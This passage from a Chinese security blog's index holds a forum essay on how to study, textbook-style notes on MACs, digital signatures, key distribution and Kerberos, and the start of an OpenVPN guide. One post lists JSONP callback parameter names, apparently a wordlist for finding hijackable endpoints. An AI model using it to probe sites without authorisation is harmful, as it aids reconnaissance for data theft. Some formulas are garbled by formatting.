站内信件</p>\n<p>很多人问如何入门如何入门，我却不知道要问的是入什么门。</p>\n<p>很少把某些好文章耐心从头看完，我这次就深有体会。比如袁哥的sniffer原理，一直以为自己对sniffer原理很清楚的，所以也就不曾仔细看过袁哥的这篇。后来有天晚上和袁哥讨论，如何通过端口读写直接获取mac地址，为什么antisniff可以获得真正的mac地址，而不受更改mac地址技术的影响，如何在linux下获得真正的mac地址。我一直对linux下的端口读写心存疑虑，总觉得在保护模式下的端口都做了内存映象等等。结果袁哥问了我一句，你仔细看我写的文章没有，我楞，最近因为要印刷月刊，我整理以前的很多文档，被迫认真过滤它们，才发现袁哥的文章让我又有新认识。再后来整理到tt的几篇缓冲区溢出的，尤其是上面的关于Solaris可装载内核模块，那就更觉得惭愧了。</p>\n<p>以前说书非借不能读，现在是文章留在硬盘上却不读。其实本版已经很多经典文章了，也推荐了不少经典书籍了，有几个好好看过呢。W.Richard.Stevens的UNP我算是认真看过加了不少旁注，APUE就没有那么认真了，而卷II的一半认真看过，写过读书笔记，卷III就没有看一页。道格拉斯的卷I、卷III是认真看过几遍，卷II就只断续看过。而很多技术文章，如果搞到手了就懒得再看，却不知道这浪费了多少资源，忽略了多少资源。BBS是真正能学到东西的地方吗？rain说不是的，我说也不是的。不过这里能开阔人的视野，能得到对大方向的指引，足够了。我一直都希望大家从这里学到的不是技术本身，而是学习方法和一种不再狂热的淡然。</p>\n<p><strong>很多技术，明天就会过时，如果你掌握的是学习方法，那你还有下一个机会，如果你掌握的仅仅是这个技术本身，你就没有机会了。</strong>其实我对系统安全是真不懂，因为我一直都喜欢看程序写程序却不喜欢也没有能力攻击谁谁的主机/站点。我所能在这里做的是，为大家提供一个方向，一种让你的狂热归于淡然的说教。如果你连<code>&lt;&lt;Windows NT设备驱动程序编写&gt;&gt;</code>、<code>&lt;&lt; win9x系统编程&gt;&gt;</code>都没有看过，却要写个什么隐藏自己的木马，搞笑。如果你看都不看汇编语言，偏要问exploit code的原理，那我无法回答也不想回答你。总有人责问，要讨个说法纭纭，说什么提问却没有回答。不回答已经是正确的处理方式了，至少没有回你一句，看书去，对不对，至少没有扰乱版面让你生闷气。Unix的man手册你要都看完了，想不会Unix都不行了。微软的MSDN、Platform SDK DOC你要看完了，你想把Win编程想象得稍微困难点都找不到理由。</p>\n<p>还是那句话，一个程序员做到W.Richard.Stevens那个份上，做到逝世后还能叫全世界的顶级hacker们专门著文怀念，但生前却不曾著文攻击，想想看，那是一种什么样的境界，那是一份什么样的淡然。我们可以大肆讨论技术问题，可以就技术问题进行激烈的卓有成效的讨论，却无意进行基础知识、资源信息的版面重复。我刚在前面贴了一堆isbase的文章，开头就是主页标识，却在后面立刻问什么主页在哪里？前面刚刚讨论过如何修改mac地址，后面马上又来一个，前后相差不过3篇文章。选择沉默已经是很多朋友忍耐力的优异表现了。很多东西都是可以举一反三的。vertex的lids，被packetstorm天天追踪更新，你要是看了THC的那三篇，觉得理解一个就理解了一堆，都是内核模块上的手脚。你不看你怎么知道。</p>\n<p>我不想在这里陷入具体技术问题的讨论中去，你要是觉得该做点什么了，就自己去看自己去找。没有什么人摆什么架子，也没有什么人生来就是干这个的。<strong>你自己问自己，尽力了吗?</strong></p>\n","categories":[],"tags":["丧的时候看一看"]},{"title":"密码学基础笔记(四)","url":"http://b1ng0.top/2019/03/18/密码学基础笔记(四)/","content":"<h2 id=\"第12章-消息认证码\"><a href=\"#第12章-消息认证码\" class=\"headerlink\" title=\"第12章  消息认证码\"></a><strong>第12章  消息认证码</strong></h2><blockquote>\n<p>完整性（Integrity）：指信息在存储或传输过程中保持未经授权不能改变的特性。</p>\n</blockquote>\n<h3 id=\"消息认证码的定义及使用方式\"><a href=\"#消息认证码的定义及使用方式\" class=\"headerlink\" title=\"消息认证码的定义及使用方式\"></a><strong>消息认证码的定义及使用方式</strong></h3><p>消息认证码，又称密码校验和或者MAC，是一种认证技术，它利用密钥来生成一个固定长度的短数据块，并将该数据块附加在消息之后。</p>\n<p>A和B共享密钥K。A想发送消息M给B，A首先计算MAC=CK(M)，其中CK(·)是密钥控制的公开函数，然后发送M‖MAC给B，B收到后做与A相同的计算，求得一新MAC，并与收到的MAC做比较。</p>\n<p><img src=\"/images/mima4/1550751645468.png\" alt=\"1550751645468\"></p>\n<p>如果只有双方知道K，且B计算得到的MAC与接收到的MAC一致，则可实现以下功能：</p>\n<ol>\n<li><strong>接收方相信发送方发来的消息未被篡改</strong>：因为攻击者不知道密钥，所以不能在篡改消息后计算出正确的MAC，而如果只篡改消息不修改MAC，则接收方计算的新MAC将与收到的MAC不同。</li>\n<li><strong>接收方相信发送方不是冒充的</strong>：因为其他人不知道密钥，所以其他人不可能对发送的消息计算出正确的MAC 。</li>\n</ol>\n<blockquote>\n<p>MAC与加密类似，不同之处在于MAC不可逆。</p>\n</blockquote>\n<p>上述过程中，由于在发送过程中消息是以明文形式存在，因此这一过程只提供认证性而不提供保密性。为提供保密性可在MAC函数以后或以前进行加密。</p>\n<p><img src=\"/images/mima4/1550751811375.png\" alt=\"1550751811375\"></p>\n<p><img src=\"/images/mima4/1550751820324.png\" alt=\"1550751820324\"></p>\n<h3 id=\"数据认证算法\"><a href=\"#数据认证算法\" class=\"headerlink\" title=\"数据认证算法\"></a><strong>数据认证算法</strong></h3><p>数据认证算法是最为广泛使用的一种消息认证码，已作为FIPS Publication（FIPS PUB 113）并被ANSI选为X9.17标准。</p>\n<p>算法基于CBC模式的DES算法，其初始向量取为零向量。将数据分为64比特长的分组D1，D2，…，DN，其中最后一个分组不够64比特的话，可在其右边填充一些0，然后按以下过程计算数据认证码。</p>\n<p><img src=\"/images/mima4/1550751939053.png\" alt=\"1550751939053\"></p>\n<h3 id=\"HMAC\"><a href=\"#HMAC\" class=\"headerlink\" title=\"HMAC\"></a><strong>HMAC</strong></h3><p>近年来研究构造MAC的兴趣主要是基于Hash函数的构造方法，这是因为：\\</p>\n<ul>\n<li>Hash函数(如MD5、SHA)的软件实现快于分组密码。</li>\n<li>Hash函数的库代码来源广泛。</li>\n</ul>\n<p>Hash函数并不是为用于MAC而设计的，由于Hash函数不使用密钥，因此不能直接用于MAC。目前已提出了很多将Hash函数用于构造MAC的方法，其中HMAC就是其中之一，已作为RFC<br>2104被公布，并在IPSec和其他网络协议（如SSL）中得以应用。</p>\n<h3 id=\"HMAC的设计目标\"><a href=\"#HMAC的设计目标\" class=\"headerlink\" title=\"HMAC的设计目标\"></a><strong>HMAC的设计目标</strong></h3><p>RFC2104列举了HMAC的以下设计目标：</p>\n<ol>\n<li>可不经修改而使用现有的Hash函数，特别是那些易于软件实现的、源代码可方便获取且免费使用的Hash函数。</li>\n<li>其中镶嵌的Hash函数可易于替换为更快或更安全的Hash函数。</li>\n<li>保持镶嵌的Hash函数的最初性能，不因用于HMAC而使其性能降低。</li>\n<li>以简单方式使用和处理密钥。</li>\n<li>在对镶嵌的Hash函数合理假设的基础上，易于分析HMAC用于认证时的密码强度。</li>\n</ol>\n<h3 id=\"算法描述\"><a href=\"#算法描述\" class=\"headerlink\" title=\"算法描述\"></a><strong>算法描述</strong></h3><p><img src=\"/images/mima4/1550752207866.png\" alt=\"1550752207866\"></p>\n<p>HMAC算法的实现如下：</p>\n<ul>\n<li>H是算法中嵌入的Hash函数，如MD5、SHA-1。</li>\n<li>M是HMAC的输入消息，mi (i=1, 2, …, L)是M的第i个分组，每个分组为b bit。</li>\n<li>K为密钥：</li>\n</ul>\n<blockquote>\n<p>当K的长度大于b bit时，用H(K)值替代原来的K，即length(K)&gt;b，则K←H(K)。</p>\n<p>当K的长度小于b bit时，将K的右边填充0，使其成为长度为b bit，记为K+，即length(K) &lt; b，则K+ ← (K || 00…0)。如果K的长度刚好等于b bit，则不作处理。</p>\n</blockquote>\n<ul>\n<li>ipad为00110110（即0x36）重复b/8次后的序列。</li>\n<li>opad为01011100（即0x5C）重复b/8次后的序列。</li>\n</ul>\n<ol>\n<li>将K+与ipad逐比特异或得到b bit的分组Si，即计算Si =K+Åipad。</li>\n<li>把输入消息M=m1m2…mL附加在Si的右端，得到Si||M。</li>\n<li>将Si||M作为Hash函数H的输入，得到n比特的输出H(Si||M)。</li>\n<li>将K+与opad逐比特异或得到b bit的分组S0，即计算S0=K+Åopad。</li>\n<li>将第3）步得到的H(Si||M)填充到b bit后附加在S0的右端。</li>\n<li>将第5）步后的值作为Hash函数H的输入，得到的输出即为消息M的消息认证码HMACK(M)。</li>\n</ol>\n<h3 id=\"HMAC的安全性\"><a href=\"#HMAC的安全性\" class=\"headerlink\" title=\"HMAC的安全性\"></a><strong>HMAC的安全性</strong></h3><p>HMAC的安全性取决于镶嵌的Hash函数的安全性，它的设计者已经证明了对HMAC的攻击等价于对内嵌Hash函数的下述两种攻击之一：</p>\n<ol>\n<li>攻击者能够计算压缩函数的一个输出，即使IV是随机的和秘密的。</li>\n<li>攻击者能够找出哈希函数的碰撞，即使IV是随机的和秘密的。</li>\n</ol>\n<h2 id=\"第13章-数字签名\"><a href=\"#第13章-数字签名\" class=\"headerlink\" title=\"第13章  数字签名\"></a><strong>第13章  数字签名</strong></h2><h3 id=\"数字签名简介\"><a href=\"#数字签名简介\" class=\"headerlink\" title=\"数字签名简介\"></a><strong>数字签名简介</strong></h3><blockquote>\n<p>1976年，Diffie和Hellman首次提出数字签名的概念，当时在学术界和计算机网络界受到了广泛重视。</p>\n</blockquote>\n<p><strong>数字签名需求</strong></p>\n<ul>\n<li>签名必须与消息相关。</li>\n<li>签名必须使用发送方某些独有的信息，防止伪造和否认。</li>\n<li>产生和验证签名都比较容易。</li>\n<li>无论是从给定的签名伪造消息，还是从给定的消息伪造签名在计算上都是不可行的。</li>\n<li>保存数字签名的副本是可行的。</li>\n</ul>\n<h3 id=\"算法描述-1\"><a href=\"#算法描述-1\" class=\"headerlink\" title=\"算法描述\"></a>算法描述</h3><p>  <strong>(1)</strong>  <strong>参数定义和密钥生成</strong> </p>\n<ul>\n<li>选两个大素数p和q；（保密）</li>\n<li>计算n=p×q, ϕ(n)=(p−1)×(q−1); （n公开, ϕ(n)保密）</li>\n<li>随机选一整数e，1&lt;e&lt;ϕ (n), 且 gcd(ϕ(n), e) = 1（公钥e公开）</li>\n<li><p>计算d，满足 d×e ≡ 1 (mod ϕ(n))（私钥d保密）      </p>\n<p><strong>(2)</strong>  <strong>签名算法</strong></p>\n</li>\n</ul>\n<p>​       设消息为m，私钥为d，签名s如下：</p>\n<p><img src=\"/images/mima4/1550752832169.png\" alt=\"1550752832169\"></p>\n<p> <strong>(3)</strong>  <strong>验证算法</strong></p>\n<p>​       接收者收到签名(m, s)时，验证如下：</p>\n<p><img src=\"/images/mima4/1550752836199.png\" alt=\"1550752836199\"></p>\n<p>若等式成立，则s是发送者对消息m的有效签名。由于s是用发送者的私钥经过签名算法所得，别人做不出这样的签名，可有效防止发送者的抵赖行为。</p>\n<p>当对较长的消息签名时，需对每个消息分组分别签名，这样运算量就很大。</p>\n<ul>\n<li>为提高RSA签名方案的效率，对大容量消息签名前，签名者可使用一个Hash函数h来产生消息摘要h(m)，再计算签名：<strong>s = Sig**</strong>sk(m) ≡ (h(m))d<strong> </strong>mod n**。</li>\n<li>接收者收到签名后先计算h(m), 再检验等式：<strong>h(m) ≡ s**</strong>e<strong> </strong>mod n** 是否成立，如果等式成立，则s是发送者对m的有效签名；否则，签名无效。</li>\n</ul>\n<h3 id=\"ElGamal数字签名方案\"><a href=\"#ElGamal数字签名方案\" class=\"headerlink\" title=\"ElGamal数字签名方案\"></a><strong>ElGamal数字签名方案</strong></h3><p><strong>(1)</strong>  <strong>参数定义和密钥生成</strong></p>\n<ul>\n<li>p是大素数</li>\n<li>g是Zp<em>的一个生成元（即本原元素）</em></li>\n<li><em>x是一个随机数，且x∈Zp</em></li>\n<li>计算：<strong>y ≡ g**</strong>x<strong> </strong>mod p**</li>\n<li>公钥为pk=(y, p, g)；私钥为sk=x</li>\n</ul>\n<p><strong>(2)</strong>  <strong>签名算法</strong></p>\n<p>​        签名者选取随机数k∈Zp*并用私钥(p, g, y, x)计算：</p>\n<p><strong>r ≡ g**</strong>k<strong> </strong>(mod p)      s ≡ (h(m)-xr)k<strong>**-1</strong> <strong>mod (p-1)</strong></p>\n<p>生成签名(r, s)，其中h(m)为消息摘要。</p>\n<p>​       <strong>(3)</strong>  <strong>验证算法</strong></p>\n<p>​        验证者用公钥(y, p, g)验证签名(r, s)：</p>\n<p><strong>y**</strong>r<strong><strong>r</strong></strong>s<strong> </strong>≡ g<strong>**h(m)</strong> <strong>(mod p)</strong></p>\n<p>如果等式成立，则签名有效；否则，签名无效。</p>\n<p><strong>ElGamal签名方案的安全性</strong></p>\n<ol>\n<li>ElGamal签名方案的安全性依赖于离散对数问题的困难性。若能求离散对数，则由y和g，可求出私有密钥x，该签名方案就不安全。</li>\n<li>素数p必须足够大，且p-1至少包含一个大素数因子。</li>\n<li>ElGamal签名是一个概率算法，对同一个消息m所产生的签名依赖于随机数k。随机数k不能泄露，且每次都不相同，否则用x=(h(m)-sk)r-1 mod (p-1)就可以计算出私钥。</li>\n</ol>\n<h3 id=\"Schnorr数字签名方案\"><a href=\"#Schnorr数字签名方案\" class=\"headerlink\" title=\"Schnorr数字签名方案\"></a><strong>Schnorr数字签名方案</strong></h3><p><strong>(1)</strong>  <strong>参数定义和密钥生成</strong></p>\n<ul>\n<li>p：大素数，p≥2512</li>\n<li>q：大素数，q|(p-1)，q≥2160</li>\n<li>g：g∈RZ*p, 且gq≡1 (mod p)</li>\n<li>x：用户A的私钥，<strong>1&lt;**</strong>x&lt;q</li>\n<li>y：用户A的公钥，<strong>y≡gx</strong>  <strong>(mod p)</strong></li>\n</ul>\n<p><strong>(2)  签名过程</strong></p>\n<ol>\n<li>选择随机数1&lt;k&lt;q，计算<strong>r≡gk</strong>  <strong>(mod p)</strong></li>\n<li>计算<strong>e=H(r, m)**</strong>;<strong> </strong>s≡xe+k (mod q)**</li>\n<li><p>签名内容(e, s)</p>\n<p><strong>(3)  验证过程</strong></p>\n</li>\n<li><p>计算<strong>r′≡g**</strong>sy-e<strong>  </strong>(mod p)**</p>\n</li>\n<li>验证<strong>H(r′, m)=e</strong>是否成立</li>\n</ol>\n<h3 id=\"数字签名标准（DSS）\"><a href=\"#数字签名标准（DSS）\" class=\"headerlink\" title=\"数字签名标准（DSS）\"></a><strong>数字签名标准（</strong>DSS）</h3><p>数字签名标准（Digital Signature Standard，DSS）由美国国家标准和技术研究所（NIST）于1991年公布。</p>\n<ul>\n<li>DSS的核心是数字签名算法（Digital Signature Algorithm，DSA）。</li>\n<li>它是ElGamal的变形，设计中使用了SHA-1算法。</li>\n<li>DSS的安全性还是基于求解离散对数的困难性。</li>\n</ul>\n<p><strong>DSS</strong>的签名与验证过程:</p>\n<p><img src=\"/images/mima4/1550753095888.png\" alt=\"1550753095888\"></p>\n<p><strong>(1)</strong>  <strong>参数定义和密钥生成</strong></p>\n<ul>\n<li>p是满足2L-1&lt;p&lt;2L的大素数，其中L是512~1024比特且是64的倍数；q是长160比特的素数，满足q|(p-1)；</li>\n<li>x是随机或者伪随机数，满足0&lt;x&lt;q；</li>\n<li>g≡h(p-1)/q mod p，其中h满足1&lt;h&lt;p-1；</li>\n<li>计算：<strong>y≡g**</strong>x<strong> </strong>mod p**；</li>\n<li>公钥：k1=(p, q, g, <strong>y</strong>)，私钥：k2=<strong>x</strong>。</li>\n</ul>\n<p><strong>(2)</strong>  <strong>签名算法</strong></p>\n<p>​        签名者选取一个随机数k，0&lt;k&lt;q。首先使用SHA-1计算出消息摘要h(m)，再使用签名算法生成签名(r, s)：</p>\n<p><strong>r ≡ g**</strong>k<strong> </strong>(mod p) (mod q)<strong>      </strong>s ≡ (h(m)+xr)k<strong>**-1</strong> <strong>mod q</strong>     </p>\n<p>​       <strong>(3)  验证算法</strong></p>\n<p>​         验证者利用公钥k1=(p, q, g, y)验证签名(r, s)：      </p>\n<p><strong>g**</strong>u<strong>1</strong>y<strong>u</strong>2<strong> </strong>(mod p) (mod q) ≡ r**</p>\n<p>其中: u1≡h(m)s-1 (mod q)， u2≡rs-1 (mod q)</p>\n<h2 id=\"第14章-密钥管理和分发\"><a href=\"#第14章-密钥管理和分发\" class=\"headerlink\" title=\"第14章 密钥管理和分发\"></a><strong>第14章 密钥管理和分发</strong></h2><h3 id=\"基于对称加密的对称密钥分发\"><a href=\"#基于对称加密的对称密钥分发\" class=\"headerlink\" title=\"基于对称加密的对称密钥分发\"></a><strong>基于对称加密的对称密钥分发</strong></h3><p>对于对称加密来说，通信双方必须使用相同的密钥并且该密钥要对其他人保密，在限制攻击者攻陷密钥所需的数据总数时，频繁的密钥交换是安全的。因此，任何密码系统的强度取决于密钥分发技术，即在想要交换数据的两者之间传递密钥且不被其他人知道的方法。</p>\n<p><img src=\"/images/mima4/1550753516318.png\" alt=\"1550753516318\"></p>\n<p>对A和B来说，密钥的分发能以以下不同的方式：</p>\n<p>1.A选择一个密钥后以物理的方式传递给B。</p>\n<p>2.第三方选择密钥后以物理的方式传递给A和B。</p>\n<p>3.如果A和先前或者最近使用过一个密钥，则一方可以将新密钥用旧密钥加密后发送给另一方。如果A和B到第三方C有加密连接，C可以在加密连接上传送密钥给A和B。</p>\n<h3 id=\"密钥分发方案\"><a href=\"#密钥分发方案\" class=\"headerlink\" title=\"密钥分发方案\"></a><strong>密钥分发方案</strong></h3><p><img src=\"/images/mima4/1550753558731.png\" alt=\"1550753558731\"></p>\n<h3 id=\"层次密钥控制\"><a href=\"#层次密钥控制\" class=\"headerlink\" title=\"层次密钥控制\"></a><strong>层次密钥控制</strong></h3><p>大型网络需要层次体系的KDC，例如有本地KDC，每一个KDC负责其所在的整个内部网络的一个域。</p>\n<p><img src=\"/images/mima4/1550753574370.png\" alt=\"1550753574370\"></p>\n<h3 id=\"透明的密钥控制方案\"><a href=\"#透明的密钥控制方案\" class=\"headerlink\" title=\"透明的密钥控制方案\"></a><strong>透明的密钥控制方案</strong></h3><p>面向连接的自动密钥分发协议。</p>\n<p><img src=\"/images/mima4/1550753594981.png\" alt=\"1550753594981\"></p>\n<h3 id=\"分布式密钥控制\"><a href=\"#分布式密钥控制\" class=\"headerlink\" title=\"分布式密钥控制\"></a><strong>分布式密钥控制</strong></h3><p>密钥分发中心必须是可信的，而且是防破坏的，但如果密钥是完全分布式的，则无此要求。虽然对只使用对称加密的大型网络，完全分布式是不实用的，但是局部环境下还是很有用的。</p>\n<p><img src=\"/images/mima4/1550753614839.png\" alt=\"1550753614839\"></p>\n<h3 id=\"基于非对称加密的对称密钥分发\"><a href=\"#基于非对称加密的对称密钥分发\" class=\"headerlink\" title=\"基于非对称加密的对称密钥分发\"></a><strong>基于非对称加密的对称密钥分发</strong></h3><p><strong>简单密钥分发方案</strong></p>\n<p><img src=\"/images/mima4/1550753634986.png\" alt=\"1550753634986\"></p>\n<p>如果PUA和IDA没有经过认证绑定，则易遭受中间人攻击。类似于Diffie-Hellman密钥交换的中间人攻击。</p>\n<p><strong>确保保密性和身份认证的密钥分发方案</strong></p>\n<p><img src=\"/images/mima4/1550753650146.png\" alt=\"1550753650146\"></p>\n<h3 id=\"公钥分发\"><a href=\"#公钥分发\" class=\"headerlink\" title=\"公钥分发\"></a><strong>公钥分发</strong></h3><p><strong>公钥的公开发布</strong></p>\n<p>无控制的公钥分发。</p>\n<p><img src=\"/images/mima4/1550753674497.png\" alt=\"1550753674497\"></p>\n<p><strong>公开可访问的目录</strong></p>\n<p>管理员维护一个动态可访问的公钥目录。</p>\n<p><img src=\"/images/mima4/1550753690915.png\" alt=\"1550753690915\"></p>\n<p><strong>公钥授权</strong></p>\n<p>管理员维护一个公钥目录且他自己也有公私钥。</p>\n<p><img src=\"/images/mima4/1550753705690.png\" alt=\"1550753705690\"></p>\n<p><strong>公钥证书</strong></p>\n<p>通信双方使用证书来交换密钥而不是通过管理员。</p>\n<p><img src=\"/images/mima4/1550753722992.png\" alt=\"1550753722992\"></p>\n<h3 id=\"X-509证书\"><a href=\"#X-509证书\" class=\"headerlink\" title=\"X.509证书\"></a><strong>X.509证书</strong></h3><p>X.509的核心是与每个用户相关的公钥证书。这些用户证书由一些可信的签证机构（Certificate<br>Authority CA）创建并被CA或用户放入目录服务器中。目录服务器本身不创建公钥和证书，仅仅为用户获得证书提供一种简单的存取方式。</p>\n<p>CA用自己的私钥签署证书，如果用户知道相应的公钥，则用户就可以验证证书是CA签署的。        </p>\n<p>CA生成的用户证书有以下特点：</p>\n<ul>\n<li><p>任何可以访问CA公钥的用户均可获得证书中的用户公钥。</p>\n</li>\n<li><p>只有CA可以修改证书。</p>\n</li>\n</ul>\n<p>由于证书不可伪造，因此证书可以存放在目录中而不需要对目录进行特别保护。</p>\n<p><strong>证书撤销</strong></p>\n<p>每一个证书都有一个有效期，这与信用卡相似。通常，新的证书会在旧证书失效前发放，另外，还可能由于以下原因提前撤回证书：</p>\n<p>1.用户私钥被认为不安全。</p>\n<p>2.用户不再信任该CA。</p>\n<p>3.CA证书被认为不安全。</p>\n<p>每个CA必须保留一张表，其中包含所有被CA撤销且还未到期的证书，包括发给用户和其他CA的证书，这张表也应被放在目录中。</p>\n<p>每个放在目录中的证书撤销列表CRL均被其发行商签名，并包含发行商的名字、表创建时间、下一张CRL表发放的时间以及每个撤销证书的入口。每个入口中包含该证书的序列号和撤销时间。</p>\n<p>当一个用户在一个消息中接收到了一个证书，用户必须确定该证书是否已被撤销。用户可以在接到证书时检查目录，为了避免目录搜索时的延迟，用户可以将证书和CRL缓存。</p>\n<h3 id=\"公钥基础设施PKI\"><a href=\"#公钥基础设施PKI\" class=\"headerlink\" title=\"公钥基础设施PKI\"></a>公钥基础设施PKI</h3><p>RFC 4949（互联网安全术语）定义了PKI系统是由硬件，软件，人，策略和程序构成的一整套体系。这些程序是用来创建，管理，存储，分发和撤销建立在非对称密码算法之上的数字证书。</p>\n<p>创建PKI的主要目的就是用来安全、便捷、高效地获得公钥。PKIX（Public Key Infrastructure X. 509）工作组在X.<br>509的基础上建立了一个可以用来构建网络认证体系的基本模型。</p>\n<p>PKIX的元素：</p>\n<ul>\n<li><strong>端实体：</strong>可以是终端用户、设备（如应用服务器、路由器等），或是其他可以在一个公钥数字证书作用范围中被认证的实体。终端实体支持PKI相关的设备。</li>\n<li><strong>签证机构（CA）：</strong>证书和CRL的发行人，常常在其上运行着一个或多个注册机构（RA），同时它还承担一些其他的管理任务。</li>\n<li>注册机构（RA）：<strong>承担一些CA的管理任务。一般来说都是和端实体注册进程相关的任务。</strong></li>\n<li>CRL发布点：<strong>CA可以通过它来发布证书撤销列表。</strong></li>\n<li>签证存取库：提供了存取数字证书和CRL的方法，可以被终端用户检索。</li>\n</ul>\n<h2 id=\"第15章-用户认证\"><a href=\"#第15章-用户认证\" class=\"headerlink\" title=\"第15章  用户认证\"></a><strong>第15章</strong>  <strong>用户认证</strong></h2><h2 id=\"远程用户认证原理\"><a href=\"#远程用户认证原理\" class=\"headerlink\" title=\"远程用户认证原理\"></a><strong>远程用户认证原理</strong></h2><p>认证一个用户的身份大致有四个常用方法：</p>\n<ul>\n<li>知道什么：如口令、个人身份号PIN或者之前准备问题的答案。</li>\n<li>拥有什么：如加密密钥、电子密钥卡和物理密钥，这种类型的认证信息称为令牌。</li>\n<li>静态生物特征：如指纹、虹膜和脸。</li>\n<li>动态生物特征：如声音模式、手写特征和打字节奏。</li>\n</ul>\n<h3 id=\"基于对称加密的远程用户认证\"><a href=\"#基于对称加密的远程用户认证\" class=\"headerlink\" title=\"基于对称加密的远程用户认证\"></a><strong>基于对称加密的远程用户认证</strong></h3><p><strong>双向认证</strong></p>\n<p>(1)  Needham-Schroeder协议</p>\n<p>①  A→KDC：IDA‖IDB‖N1</p>\n<p>②  KDC→A：EKa[KS‖IDB‖N1‖EKB[KS‖IDA]]</p>\n<p>③  A→B：EKb[KS‖IDA]</p>\n<p>④  B→A：EKs[N2]</p>\n<p>⑤  A→B：EKs[f(N2)]</p>\n<p><img src=\"/images/mima4/1550754509110.png\" alt=\"1550754509110\"></p>\n<p>(2)  Denning协议</p>\n<p>​        为防止重放攻击，可在第②步和第③步加上时戳：</p>\n<p>①  A→KDC：IDA‖IDB</p>\n<p>②  KDC→A：EKA[KS‖IDB‖T‖EKB[KS‖IDA‖T]]</p>\n<p>③  A→B：EKB[KS‖IDA‖T]</p>\n<p>④  B→A：EKS[N1]</p>\n<p>⑤  A→B：EKS[f(N1)]</p>\n<p><img src=\"/images/mima4/1550754522663.png\" alt=\"1550754522663\"></p>\n<p>(3)  NEUM93协议</p>\n<p>​       为了防止时钟不同步，同时加入随机数和时间戳。 </p>\n<p>①  A→B：IDA‖NA</p>\n<p>②  B→KDC：IDB‖NB‖EKB[IDA‖NA‖TB]</p>\n<p>③  KDC→A：EKA[IDB‖NA‖KS‖TB]‖EKB[IDA‖KS‖TB]‖NB</p>\n<p>④  A→B：EKB[IDA‖KS‖TB]‖EKS[NB]</p>\n<p>以上协议为A、B双方建立共享的会话密钥提供了一个安全有效的手段。如果A保留由协议得到的票据，就可在有效时间范围内不再求助于认证服务器： </p>\n<p>​       ①  A→B：EKB[IDA‖KS‖TB],  N′A</p>\n<p>​        ②  B→A：N′B，EKS[N′A]</p>\n<p>​        ③  A→B：EKS[N′B]</p>\n<p>B在收到票据后，可通过TB检验票据是否过时，而新产生的随机数N′A、N′B则向双方保证了没有重放攻击。</p>\n<p><strong>单向认证</strong></p>\n<p>电子邮件等网络应用有一个最大的优点就是不要求收发双方同时在线，发送方将邮件发往接收方的信箱，邮件在信箱中存着，直到接收方阅读时才打开。</p>\n<p>①  A→KDC：IDA‖IDB‖N1</p>\n<p>②  KDC→A：EKA[KS‖IDB‖N1‖EKB[KS‖IDA]]</p>\n<p>③  A→B：EKB[KS‖IDA]‖EKS[M]</p>\n<p>​        本协议不要求B同时在线，但保证了只有B能解读消息，同时还提供了对消息的发方A的认证。</p>\n<h3 id=\"Kerberos\"><a href=\"#Kerberos\" class=\"headerlink\" title=\"Kerberos\"></a><strong>Kerberos</strong></h3><p>Kerberos是MIT开发的认证服务系统，它建立了一个中心认证服务器用以向用户和服务器提供相互认证。</p>\n<p>用户希望访问网络服务器，服务器要求认证用户的访问请求，并仅允许通过认证的用户访问，以防未授权用户得到服务和数据。以Kerberos V4为例，系统使用的协议是基于Needham-Schroeder认证协议。</p>\n<p><img src=\"/images/mima4/1550754594047.png\" alt=\"1550754594047\"></p>\n<p><strong>Kerberos V4</strong></p>\n<p>如果网络环境未加任何保护手段，则任一用户都可获取任一服务器（V）提供的服务。这时明显的安全威胁是假冒，即敌手可假装是一客户以获取访问服务器的特权。为防止这种假冒，服务器应能够确定客户的身份，但在开放环境中则给服务器增加了过重的负担。为此引入一个称为认证服务器AS（authentication server）的第三方来承担对用户的认证，AS知道每个用户的口令，并将口令存在一个中心数据库。</p>\n<p>Kerberos认证系统设置了两个服务器：</p>\n<ul>\n<li>认证服务器（Authentication Server, AS）</li>\n<li>票据许可服务器（Ticket-Granting Server, TGS）</li>\n</ul>\n<p><img src=\"/images/mima4/1550754622584.png\" alt=\"1550754622584\"></p>\n<p><strong>Kerberos V4**</strong>的认证过程**</p>\n<p>​       分为三个阶段六个步骤：</p>\n<ul>\n<li>阶段1  (认证服务交换)</li>\n<li>阶段2  (票据许可服务交换)</li>\n<li>阶段3  (客户与业务服务器的认证交换)</li>\n</ul>\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h2><p>以Rivest的话结尾：</p>\n<blockquote>\n<p><strong>密码学是一门研究如何在敌人存在的环境中安全通信的学科。</strong></p>\n</blockquote>\n","categories":[],"tags":["密码学"]},{"title":"回调参数收集","url":"http://b1ng0.top/2019/03/08/回调参数收集/","content":"<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">callback=test</span><br><span class=\"line\">cb=test</span><br><span class=\"line\">jsonp=test</span><br><span class=\"line\">jsonpcallback=test</span><br><span class=\"line\">jsonpcb=test</span><br><span class=\"line\">jsconpcb=test</span><br><span class=\"line\">json=test</span><br><span class=\"line\">jsonp=test</span><br><span class=\"line\">jsoncallback=test</span><br><span class=\"line\">jcb=test</span><br><span class=\"line\">call=test</span><br><span class=\"line\">jsoncallb=test</span><br><span class=\"line\">json_callb=test</span><br><span class=\"line\">jsonp_callback=test</span><br><span class=\"line\">json_callback=test</span><br><span class=\"line\">jsonp_cb=test</span><br><span class=\"line\">callbackparam=test</span><br><span class=\"line\">jsconpcb=test</span><br><span class=\"line\">jscon=test</span><br><span class=\"line\">jsconcallback=test</span><br></pre></td></tr></table></figure>\n","categories":[],"tags":["javascript"]},{"title":"openvpn实现用户名密码登陆","url":"http://b1ng0.top/2019/02/24/openvpn实现用户名密码登陆/","content":"<h2 id=\"openvpn实现用户名密码登陆\"><a href=\"#openvpn实现用户名密码登陆\" class=\"headerlink\" title=\"openvpn实现用户名密码登陆\"></a>openvpn实现用户名密码登陆</h2><h3 id=\"0x00-openvpn安装\"><a href=\"#0x00-openvpn安装\" class=\"headerlink\" title=\"0x00 openvpn安装\"></a>0x00 